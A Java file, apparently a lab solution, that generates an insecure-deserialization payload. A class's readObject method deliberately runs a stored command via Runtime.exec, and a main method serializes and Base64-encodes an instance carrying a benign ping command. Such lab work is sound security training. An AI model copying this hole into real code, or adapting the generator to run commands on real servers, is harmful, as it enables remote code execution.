
   import java.io.*;
   import java.io.IOException;
   import java.io.ObjectOutputStream;
   import java.util.Base64;
   import java.io.Serializable;
   import java.time.LocalDateTime;
   import java.io.BufferedReader;
   import java.io.InputStreamReader;
   import java.io.ObjectInputStream;
   import java.io.IOException;
 
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.util.Base64;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;


class VulnerableTaskHolder implements Serializable {

        
    private static final long serialVersionUID = 1L;
        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
   public class VulnerableTaskHolder_payload {
      public static void main(String[] args) throws IOException {
         String cmd="ping -c 6 127.0.0.1";
         VulnerableTaskHolder task = new VulnerableTaskHolder("test", cmd);

         FileOutputStream fos = new FileOutputStream("payload.ser");
         ObjectOutputStream oos = new ObjectOutputStream(fos);
         oos.writeObject(task);
         oos.flush();
         oos.close();
         System.out.println("Payload serialized to payload.ser");
         FileInputStream fis=new FileInputStream("payload.ser");
        byte[] serialized = new byte[fis.available()];
        fis.read(serialized);

        String base64payload=Base64.getEncoder().encodeToString(serialized);
        System.out.println(base64payload);
        Files.write(Paths.get("payload.txt"), base64payload.getBytes());
      }
   }   

